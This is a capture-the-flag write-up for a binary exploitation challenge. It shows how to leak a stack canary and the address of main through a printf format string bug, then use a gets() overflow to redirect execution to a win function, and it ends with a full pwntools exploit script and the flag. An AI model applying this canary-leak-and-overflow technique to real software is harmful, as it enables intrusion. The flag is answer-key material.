# Baby Cookie
![](https://img.shields.io/badge/category-pwn-blue)
![](https://img.shields.io/badge/points-100-orange)

## Description
Ok with this guard, there's no way you can smash my stack! Wait! what do you mean there's another bug?

[babycookie.zip](https://ctf.mcpt.ca/media/problem/RRl33SBvcqvkk0FNgeCwBmNcfiISxJCWwaAMDC21raA/babycookie_mKn533H.zip)

## Solution
The `gets` function has a buffer overflow that we can abuse to overwrite the return pointer. But, now there is a stack canary that will terminate the program if we try and do a stack overflow.
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

Luckily for us, we also have a printf format string vulnerability that can be used to read the cookie. The stack canary is on the stack, and contains a `00` in its hex representation, making it easy to spot.

We can set a breakpoint right before the printf, run the program until it pauses, and examine the stack.
```
gdb-peda$ stack 50
0000| 0x7ffe6e73cf70 --> 0x562025b91040 --> 0x400000006 
0008| 0x7ffe6e73cf78 --> 0xf0b5ff 
0016| 0x7ffe6e73cf80 --> 0xc2 
0024| 0x7ffe6e73cf88 --> 0x7ffe6e73cfb7 --> 0x562025b9214000 
0032| 0x7ffe6e73cf90 --> 0x7ffe6e73cfb6 --> 0x562025b921400000 
0040| 0x7ffe6e73cf98 --> 0x562025b9244d (<__libc_csu_init+77>:  add    rbx,0x1)
0048| 0x7ffe6e73cfa0 --> 0x7fcc07000a64 
0056| 0x7ffe6e73cfa8 --> 0x562025b92400 (<__libc_csu_init>:     endbr64)
0064| 0x7ffe6e73cfb0 --> 0x0 
0072| 0x7ffe6e73cfb8 --> 0x562025b92140 (<_start>:      endbr64)
0080| 0x7ffe6e73cfc0 --> 0x7ffe6e73d0c0 --> 0x1 
0088| 0x7ffe6e73cfc8 --> 0x38acfc2c2306b300 
```

It's at position 12, which means the actual offset we must pass to printf should be around 12+4=16. This is because offsets 1-4 of printf will actually read from registers instead of the stack. With some trial and error, we can determine that we should leak number 17.

```
What is your name?
%17$p
Hi 0xf4f6f02aa154000
```

Next, we also have to leak the address of the win function, since the program is now positionally independent. Luckily, a few lines down the stack, we have this, at position 23 (find using trial and error):
```
0136| 0x7ffe6e73cff8 --> 0x562025b922a2 (<main>:        endbr64)
```
This points to the start of main, and the distance between the functions is always the same.

```
gdb-peda$ p main - print_flag
$3 = 0x79
```

Now we have everything we need. First, we leak the canary and main address, and then when we perform our buffer overflow, we overwrite the canary and then the return address. 

Now, we need to figure out how to structure our overflow to contain the cookie. If we advance the program instruction-by-instruction until the `gets` line, we can examine where on the stack it reads onto, and also how far it is until we need to overwrite.
```
=> 0x563a79b953d6 <main+308>:   call   0x563a79b95100 <gets@plt>
   0x563a79b953db <main+313>:   mov    eax,0x0
   0x563a79b953e0 <main+318>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x563a79b953e4 <main+322>:   xor    rcx,QWORD PTR fs:0x28
   0x563a79b953ed <main+331>:   je     0x563a79b953f4 <main+338>
Guessed arguments:
arg[0]: 0x7ffc606759e0 --> 0xc2 
```
This shows us that `gets` will start reading to this stack address. We can then count how far down the cookie and return address is, staring from this address.

```
gdb-peda$ stack 25
0000| 0x7ffc606759d0 --> 0x563a79b94040 --> 0x400000006 
0008| 0x7ffc606759d8 --> 0xf0b5ff 
1   | 0x7ffc606759e0 --> 0xc2 
2   | 0x7ffc606759e8 --> 0x7ffc60675a17 --> 0x563a79b9514000 
3   | 0x7ffc606759f0 --> 0x7ffc60675a16 --> 0x563a79b951400000 
4   | 0x7ffc606759f8 --> 0x563a79b9544d (<__libc_csu_init+77>:  add    rbx,0x1)
5   | 0x7ffc60675a00 ("%17$p %23$p\n")
6   | 0x7ffc60675a08 --> 0x56000a702433 ('3$p\n')
7   | 0x7ffc60675a10 --> 0x0 
8   | 0x7ffc60675a18 --> 0x563a79b95140 (<_start>:      endbr64)
9   | 0x7ffc60675a20 --> 0x7ffc60675b20 --> 0x1 
CAN | 0x7ffc60675a28 --> 0x5ef5e94018a11000 
11  | 0x7ffc60675a30 --> 0x0 
RET | 0x7ffc60675a38 --> 0x7f42abc480b3 (<__libc_start_main+243>:       mov    edi,eax)
```

This tells us that we need to write 9\*8 bytes of garbage, followed by the stack canary, followed by 8 more garbage bytes, and then the return address.

```py
from pwn import *

#p = process("./babycookie")
p = remote("d35bbf2.0x16.ink", 30275)

pay = b'\n'*4 + b'%17$p %23$p'

p.sendline(pay)
p.recvuntil(b"Hi ")
addrs = p.recvuntil(b"\n")[:-1].split(b" ")     # 0xcanary 0xmain_addr\n
canary = int(addrs[0], 16)
main = int(addrs[1], 16)
win = main - 0x79
log.info("Canary: " + hex(canary))
log.info("Main: " + hex(main))
log.info("Win: " + hex(win))
p.recvuntil(b"?\n")

p.send(b'A'*9*8 + p64(canary) + p64(0) + p64(win) + b'\n')   # 9 stack entries + canary + garbage + win
p.interactive()
```


Flag: `CTF{Modern_security_still_has_its_flaws!}`
